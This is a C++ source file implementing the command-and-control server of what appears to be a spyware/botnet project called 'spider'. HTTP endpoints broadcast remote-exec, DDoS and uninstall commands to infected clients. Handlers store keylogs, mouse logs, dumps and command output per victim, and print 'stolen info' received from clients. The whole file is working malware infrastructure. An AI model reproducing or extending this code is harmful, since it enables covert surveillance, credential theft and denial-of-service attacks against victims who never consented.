//
//  main.hpp
//  spider_server
//
//  Created by Victor Sousa on 28/09/2017.
//
//

#include "ApiHandler.hpp"
#include "Server.hpp"
#include "Status.hpp"
#include "Exec.hpp"
#include "Dump.hpp"
#include "Mouse.hpp"
#include "Stealer.hpp"
#include "Keyboard.hpp"
#include "Database/BddEndPoint.hpp"
#include "Database/Bool.hpp"
#include "Database/Keylog.hpp"
#include "Database/Mouselog.hpp"
#include "Database/DumpInfo.hpp"
#include "Database/ExecInfo.hpp"

http::ApiHandler::ApiHandler() {
  this->registerCalls();
}

void http::ApiHandler::registerCalls() {
  this->_callMap["/api/wp_status"] = [](const std::string& request, const std::string& body) {
    std::cout << body << std::endl;
    boost::property_tree::ptree root;
    std::stringstream ss(body);
    try {
      boost::property_tree::read_json(ss, root);
    } catch (std::exception& e) {
      std::cerr << "exception: " << e.what() << std::endl;
      return http::Reply::json_reply("{\"res\": false, \"error\": \"Server failed to read your json\"}");
    }

    direct::Server::Singleton->broadcast("setStatus " + body);

    return http::Reply::json_reply("{\"res\": true}");
  };

  this->_callMap["/api/wp_exec"] = [](const std::string& request, const std::string& body) {
    boost::property_tree::ptree root;
    std::stringstream ss(body);
    try {
      boost::property_tree::read_json(ss, root);
    } catch (std::exception& e) {
      std::cerr << "exception: " << e.what() << std::endl;
      return http::Reply::json_reply("{\"res\": false, \"error\": \"Server failed to read your json\"}");
    }

    direct::Server::Singleton->broadcast("doExec " + body);

    return http::Reply::json_reply("{\"res\": true}");
  };

  this->_callMap["/api/wp_ddos"] = [](const std::string& request, const std::string& body) {
    std::cout << body << std::endl;
    boost::property_tree::ptree root;
    std::stringstream ss(body);
    try {
      boost::property_tree::read_json(ss, root);
    } catch (std::exception& e) {
      std::cerr << "exception: " << e.what() << std::endl;
      return http::Reply::json_reply("{\"res\": false, \"error\": \"Server failed to read your json\"}");
    }

    direct::Server::Singleton->broadcast("ddos " + body);

    return http::Reply::json_reply("{\"res\": true}");
  };

  this->_callMap["/api/wp_uninstall"] = [](const std::string& request, const std::string& body) {
    std::cout << body << std::endl;
    boost::property_tree::ptree root;
    std::stringstream ss(body);
    try {
      boost::property_tree::read_json(ss, root);
    } catch (std::exception& e) {
      std::cerr << "exception: " << e.what() << std::endl;
      return http::Reply::json_reply("{\"res\": false, \"error\": \"Server failed to read your json\"}");
    }

    direct::Server::Singleton->broadcast("uninstall " + body);

    return http::Reply::json_reply("{\"res\": true}");
  };

  this->_callMap["/api/wp_clients"] = [](const std::string& request, const std::string& body) {
    std::cout << body << std::endl;
    return http::Reply::json_reply(BddEndPoint::getClientsJson());
  };
}


direct::ApiHandler::ApiHandler() {
  this->registerCalls();
}

void direct::ApiHandler::registerCalls() {
  this->_callMap[direct::IContent::ContentType::Status] = [](const direct::IContent* request) {
    const direct::Status *status = static_cast<const direct::Status *>(request);
    Bdd *client = static_cast<Bdd *>(BddEndPoint::getClientsByID(status->getClientID()));
    static_cast<Bool *>((*client)("status"))->setValue(status->getStatus() == "running" ? true : false);
    return Message("");
  };

  this->_callMap[direct::IContent::ContentType::Exec] = [](const direct::IContent* request) {
    const direct::Exec *exec = static_cast<const direct::Exec *>(request);
    Bdd *client = static_cast<Bdd *>(BddEndPoint::getClientsByID(exec->getClientID()));
    ExecInfo *execlog = new ExecInfo(exec->getCommand(), exec->getResult());
    client->addLine(execlog);
    return Message("");
  };

  this->_callMap[direct::IContent::ContentType::Dump] = [](const direct::IContent* request) {
    const direct::Dump *dump = static_cast<const direct::Dump *>(request);
    Bdd *client = static_cast<Bdd *>(BddEndPoint::getClientsByID(dump->getClientID()));
    String seekOriginString(dump->getOrigin());
    std::vector<IObject *> resultDumpInfo = client->find(std::vector<Research>{Research("origin", Comparator::EQUAL, &seekOriginString)});
    if (resultDumpInfo.size() == 0) {
      DumpInfo *dumpInfo = new DumpInfo(dump->getOrigin(), dump->getContent());
      client->addLine(dumpInfo);
    } else {
      Bdd *dumpInfo = static_cast<Bdd *>(resultDumpInfo[0]);
      static_cast<String *>((*dumpInfo)("content"))->setValue(dump->getContent());
    }
    return Message("");
  };

  this->_callMap[direct::IContent::ContentType::Mouse] = [](const direct::IContent* request) {
    const direct::Mouse *mouse = static_cast<const direct::Mouse *>(request);
    Bdd *client = static_cast<Bdd *>(BddEndPoint::getClientsByID(mouse->getClientID()));
    Mouselog *mouselog = new Mouselog(mouse->getClick(), mouse->getPosition(), mouse->getTimestamp());
    client->addLine(mouselog);

    return Message("");
  };

  this->_callMap[direct::IContent::ContentType::Stealer] = [](const direct::IContent* request) {
    const direct::Stealer *stealer = static_cast<const direct::Stealer *>(request);
    std::cout << "Client " << stealer->getClientID() << " has sent a stolen info: " << stealer->getOrigin() << " = " << stealer->getContent() << std::endl;
    return Message("");
  };

  this->_callMap[direct::IContent::ContentType::Keyboard] = [](const direct::IContent* request) {
    const direct::Keyboard *keyboard = static_cast<const direct::Keyboard *>(request);
    Bdd *client = static_cast<Bdd *>(BddEndPoint::getClientsByID(keyboard->getClientID()));
    Keylog *keylog = new Keylog(keyboard->getProcessName(), keyboard->getContent(), keyboard->getTimestamp());
    client->addLine(keylog);
    return Message("");
  };
}
